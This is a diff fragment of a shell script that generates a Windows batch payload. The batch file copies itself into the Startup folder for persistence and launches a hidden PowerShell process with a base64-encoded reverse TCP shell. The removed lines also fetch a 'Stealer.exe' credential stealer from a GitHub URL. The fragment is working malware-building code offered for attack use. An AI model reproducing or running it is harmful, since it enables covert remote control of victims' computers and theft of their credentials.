@@ -48,8 +48,7 @@ sleep 1
 echo -e "@echo off" >> $ps_tcp.bat 
 echo -e "cd %temp%" >> $ps_tcp.bat
 echo -e '''copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"''' >> $ps_tcp.bat
-echo -n "powershell -executionpolicy bypass -windowstyle hidden -e " >> $ps_tcp.bat;pwsh -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText('powershell_reverse_tcp.txt')))" >> $ps_tcp.bat
-echo -n "powershell -executionpolicy bypass -windowstyle hidden wget -o Stealer.exe "https://github.com/r00t-3xp10it/meterpeter/raw/master/mimiRatz/DarkRCovery.exe" >> $ps_tcp.bat 
+echo -n "powershell -executionpolicy bypass -windowstyle hidden -noexit -nologo -e " >> $ps_tcp.bat;pwsh -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText('powershell_reverse_tcp.txt')))" >> $ps_tcp.bat
 rm -rf powershell_reverse_tcp.txt
 sleep 1
 printf "\e[1;36m Payload Is Created SuccessFully.\e[0m\n"
